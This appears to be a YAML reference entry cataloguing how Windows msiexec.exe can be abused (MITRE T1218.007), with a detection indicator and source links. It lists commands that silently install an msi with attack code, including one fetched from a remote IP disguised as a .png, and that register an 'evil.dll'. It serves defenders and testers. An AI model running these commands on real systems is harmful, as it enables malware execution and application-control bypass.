---
Name: Msiexec.exe
Description: Used by Windows to execute msi files
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: msiexec /quiet /i cmd.msi
    Description: Installs the target .MSI file silently.
    Usecase: Execute custom made msi file with attack code
    Category: Execute
    Privileges: User
    MitreID: T1218.007
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: msiexec /q /i http://192.168.100.3/tmp/cmd.png
    Description: Installs the target remote & renamed .MSI file silently.
    Usecase: Execute custom made msi file with attack code from remote server
    Category: Execute
    Privileges: User
    MitreID: T1218.007
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: msiexec /y "C:\folder\evil.dll"
    Description: Calls DLLRegisterServer to register the target DLL.
    Usecase: Execute dll files
    Category: Execute
    Privileges: User
    MitreID: T1218.007
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: msiexec /z "C:\folder\evil.dll"
    Description: Calls DLLRegisterServer to un-register the target DLL.
    Usecase: Execute dll files
    Category: Execute
    Privileges: User
    MitreID: T1218.007
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\msiexec.exe
  - Path: C:\Windows\SysWOW64\msiexec.exe
Code_Sample:
  - Code:
Detection:
  - IOC: msiexec.exe getting files from Internet
Resources:
  - Link: https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
  - Link: https://twitter.com/PhilipTsukerman/status/992021361106268161
Acknowledgement:
  - Person: netbiosX
    Handle: '@netbiosX'
  - Person: Philip Tsukerman
    Handle: '@PhilipTsukerman'
---
